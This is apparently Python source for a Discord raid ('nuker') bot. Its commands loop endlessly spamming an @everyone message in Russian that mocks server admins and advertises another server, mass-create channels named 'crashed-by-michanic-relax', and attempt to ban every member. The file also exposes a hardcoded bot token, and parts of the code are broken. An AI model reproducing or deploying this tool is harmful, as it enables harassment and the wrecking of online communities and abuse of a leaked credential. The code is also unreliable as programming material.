import discord
from discord.ext import commands
from asyncio import sleep
from discord.utils import get

bot = commands.Bot(command_prefix='!')

TOKEN = 'OTk3NTgyMTgxMjQ3NTA0NTE2.GHlXr0.4SKsqkpPHHCDhR-O-eqrGAndFG2OZcNr5x57ZI'

@bot.event
async def crash(ctx, m):
    count = 0
    count3 = 0
    while count == count3:
        await ctx.send('@everyone\nУважаемые участники данного сервера :sunglasses:!\nК сожалению, админ или модератор этого сервера оказался :mammoth:ом, и добавил меня на сервер :clap:\nНу вообщем я так быстро всё удалил, что ваши колхозные aдмины ничего не сделали :joy:\nВообщем, наш сервер: https://discord.gg/3shCddTUsv :yellow_heart:')
        
    guild = ctx.message.guild

    await guild.create_text_channel("crashed-by-michanic-relax")
    count1 = 0
    count2 = 0
    while count1 == count2:
        guild = ctx.message.guild
        await guild.create_text_channel('crashed-by-michanic-relax ')
       

    for m in ctx.guild.members:
        try:
            await m.ban
        except:
            pass


@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.content.startswith('!спам'):
          count = 0
          while count == 0:
            await  message.channel.send('@everyone\nУважаемые участники данного сервера :sunglasses:!\nК сожалению, админ или модератор этого сервера оказался :mammoth:ом, и добавил меня на сервер :clap:\nНу вообщем я так быстро всё удалил, что ваши колхозные aдмины ничего не сделали :joy:\nВообщем, наш сервер: https://discord.gg/3shCddTUsv :yellow_heart:')
            
  


bot.run(TOKEN)


@bot.event
async def on_ready():
    print("the bot is ready")